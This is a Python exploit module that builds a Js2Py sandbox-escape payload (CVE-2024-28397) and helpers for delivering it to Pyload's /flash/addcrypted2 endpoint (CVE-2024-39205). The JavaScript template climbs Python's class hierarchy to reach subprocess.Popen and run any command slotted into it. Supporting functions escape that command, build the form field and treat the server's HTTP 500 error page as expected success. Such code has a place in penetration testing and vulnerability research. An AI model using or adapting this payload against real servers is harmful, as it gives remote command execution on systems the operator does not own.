#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Js2Py sandbox escape (CVE-2024-28397) and Pyload /flash/addcrypted2 helpers (CVE-2024-39205)."""

import base64
import os
import re
from typing import Optional

# CVE-2024-28397 — adapted from public PoC (Ali Sünbül / xeloxa).
_JS2PY_TEMPLATE = """
    var output = "Initial";
    try {
        var leaked_wrapper = Object.getOwnPropertyNames({});
        var object_class = leaked_wrapper.__getattribute__("__class__").__base__;
        function find_popen(cls) {
            var subs = cls.__subclasses__();
            for (var i = 0; i < subs.length; i++) {
                var item = subs[i];
                try {
                    if (item.__module__ == "subprocess" && item.__name__ == "Popen") {
                        return item;
                    }
                } catch (e) {
                }
                if (item.__name__ != "type") {
                    try {
                        var result = find_popen(item);
                        if (result) return result;
                    } catch (e) {}
                }
            }
            return null;
        }
        var Popen = find_popen(object_class);
        if (Popen) {
            var res = Popen("__COMMAND__", -1, null, -1, -1, -1, null, null, true).communicate();
            output = res;
        } else {
            output = "Error: Could not find subprocess.Popen";
        }
    } catch (e) {
        output = "Error during exploit execution: " + e;
    }
    output
"""


def escape_command_for_js_string(command: str) -> str:
    """Escape for embedding as the first argument to Popen(\"...\") in generated JS."""
    return command.replace("\\", "\\\\").replace('"', '\\"')


def build_js2py_cve_2024_28397_payload(command: str) -> str:
    """Return JavaScript evaluated by Js2Py ≤ 0.74 to run ``command`` on the host."""
    safe = escape_command_for_js_string(command)
    return _JS2PY_TEMPLATE.replace("__COMMAND__", safe).strip()


def random_crypted_b64() -> str:
    """Random base64 blob for the ``crypted`` form field (matches Metasploit behaviour)."""
    return base64.b64encode(os.urandom(4)).decode()


_PYLOAD_ERROR_TITLE = re.compile(
    r"<title>\s*Sorry,\s*something\s+went\s+wrong\.\.\.\s*:\(\s*</title>",
    re.IGNORECASE | re.DOTALL,
)


def pyload_addcrypted_expected_failure(resp_body: Optional[str], status_code: int) -> bool:
    """
    Pyload often answers with HTTP 500 and a generic error page after the Js runs
    (Metasploit treats this as an expected outcome).
    """
    if status_code != 500 or not resp_body:
        return False
    return bool(_PYLOAD_ERROR_TITLE.search(resp_body)) or (
        "Sorry, something went wrong" in resp_body and ":(" in resp_body
    )


def flash_addcrypted2_path(base_path: str) -> str:
    """Path to ``/flash/addcrypted2`` under an optional install prefix."""
    p = (base_path or "/").strip()
    if not p.startswith("/"):
        p = "/" + p
    p = p.rstrip("/")
    return f"{p}/flash/addcrypted2" if p else "/flash/addcrypted2"
